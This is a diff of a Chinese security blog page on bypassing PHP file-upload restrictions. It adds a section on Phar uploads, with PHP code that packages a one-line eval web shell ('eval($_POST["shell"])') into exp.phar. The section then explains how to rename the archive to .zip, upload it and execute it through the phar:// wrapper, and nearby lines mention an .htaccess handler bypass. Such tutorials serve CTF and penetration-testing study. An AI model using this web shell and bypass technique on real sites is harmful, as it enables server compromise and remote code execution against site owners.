@@ -63,7 +63,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article" style="position: absolute; top: 40px; z-index: 2;">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">PHP文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6"><span class="toc-text">前端限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E9%99%90%E5%88%B6"><span class="toc-text">后端限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-text">.user.ini配置文件绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess-%E7%8E%AF%E5%A2%83%E4%B8%BAApache%E6%97%B6%E4%BD%BF%E7%94%A8"><span class="toc-text">.htaccess(环境为Apache时使用)</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">PHP文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6"><span class="toc-text">前端限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E9%99%90%E5%88%B6"><span class="toc-text">后端限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-text">.user.ini配置文件绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess-%E7%8E%AF%E5%A2%83%E4%B8%BAApache%E6%97%B6%E4%BD%BF%E7%94%A8"><span class="toc-text">.htaccess(环境为Apache时使用)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phar%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">Phar文件上传</span></a></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -205,7 +205,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #00a596">文件上传</a>
+                <a href="/blog/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #ff7d73">文件上传</a>
             </span>
             
         </span>
@@ -279,6 +279,26 @@ Addhandler php5-script .jpg
 <li>记得改Content-Type</li>
 </ul>
 <hr>
+<h2 id="Phar文件上传"><a href="#Phar文件上传" class="headerlink" title="Phar文件上传"></a>Phar文件上传</h2><blockquote>
+<p>利用phar:&#x2F;&#x2F;伪协议将文件打包成压缩包并上传</p>
+</blockquote>
+<p>构造phar包</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST["shell"]); ?>'</span><span class="token punctuation">;</span> <span class="token comment">//一句话木马</span>
+    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
+    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
+    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$payload</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
+    <span class="token comment">// $phar->setMetadata(...); //在metadata添加内容，可参考 phar反序列化，此处用不着，故注释</span>
+    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果报错需要在php.ini中修改为<code>phar.readonly=Off</code>并重启php服务</p>
+<p><img src="/blog/2023/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230427113102867.png" alt="image-20230427113102867"></p>
+<p>然后运行即可得到一个内含一句话木马exp.php的phar包</p>
+<p>上传时把后缀名改为zip</p>
+<p>然后使用<code>phar://</code>协议读取这个压缩包中的一句话木马</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">phar<span class="token punctuation">:</span><span class="token comment">//xxxxxxxxxxxxxxxxx(存入的路径名).zip/exp</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 
     </div>
     
